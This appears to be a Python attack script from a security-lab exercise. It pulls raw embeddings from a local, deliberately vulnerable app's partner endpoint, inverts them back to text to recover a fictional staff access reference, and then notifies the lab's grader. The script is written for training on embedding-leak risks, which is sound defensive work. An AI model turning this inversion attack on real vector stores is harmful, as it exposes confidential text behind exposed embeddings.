#!/usr/bin/env python3
"""Attack skill — invert the vector store's leaked embeddings back to text.

AUTHORIZED SECURITY-LAB USE ONLY. Targets this skill's own vulnerable_app.py.

Plays the attacker from ``assets/inversion_attack.json``: Hoofline Feeds'
partner account reads ``GET /vectors`` (the "partner analytics sync", which
returns ids, titles and raw embeddings but no text), then runs the inversion
search (``invert_vectors.invert``) on every vector it got, here on the
attacker's side of the wire. It never reads a note. The only goal is the
fictional staff access reference.

Then it calls ``POST /api/attack``, so the target records that the attack is
running and grades the suite against what the attacker recovers.

Exit code: 0 when the attack was played, 1 when the target is unreachable.

Examples:
    python scripts/run_inversion_attack.py
    python scripts/run_inversion_attack.py --budget 5000
"""

from __future__ import annotations

import argparse
import json
import os
import sys
import urllib.error
import urllib.request

SKILL_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DEFAULT_TARGET = os.getenv("HX07_TARGET", "http://127.0.0.1:5507")
sys.path.insert(0, SKILL_DIR)
sys.path.insert(0, os.path.join(SKILL_DIR, "scripts"))


def _post(url: str, body: dict) -> dict:
    req = urllib.request.Request(
        url, data=json.dumps(body).encode("utf-8"),
        headers={"Content-Type": "application/json"}, method="POST",
    )
    with urllib.request.urlopen(req, timeout=300) as resp:
        return json.loads(resp.read())


def _get(url: str) -> dict:
    with urllib.request.urlopen(url, timeout=60) as resp:
        return json.loads(resp.read())


def check_target(base: str) -> bool:
    try:
        ok = _get(f"{base}/health").get("demo") == "hx07"
    except (urllib.error.URLError, OSError, ValueError):
        ok = False
    if not ok:
        print(f"[-] {base} is not the HX07 target. Start it: python vulnerable_app.py")
    return ok


def main(argv=None) -> int:
    from invert_vectors import invert

    with open(os.path.join(SKILL_DIR, "assets", "inversion_attack.json"), encoding="utf-8") as fh:
        plan = json.load(fh)
    parser = argparse.ArgumentParser(description=__doc__,
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--target", default=DEFAULT_TARGET)
    parser.add_argument("--budget", type=int, default=int(plan.get("budget", 20000)),
                        help="search nodes per vector")
    args = parser.parse_args(argv)
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8")
    if not check_target(args.target):
        return 1
    records = _get(f"{args.target}{plan['endpoint']}?account={plan['attacker']}")["records"]
    with_vec = [r for r in records if "embedding" in r]
    print(f"[+] {plan['endpoint']} as '{plan['attacker']}': {len(records)} records, {len(with_vec)} raw vectors, "
          "no text.")
    for row in with_vec:
        got = invert(row["embedding"], max(1, min(args.budget, 100_000)))
        print(f"[*] {row['tenant']}/{row['id']} ({'complete' if got.complete else 'partial'}, {got.nodes} nodes)")
        print(f"    recovered> {got.text[:110]}")
    _post(f"{args.target}/api/attack", {})
    print("[*] Re-run scripts/evaluate_kpi.py to measure.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
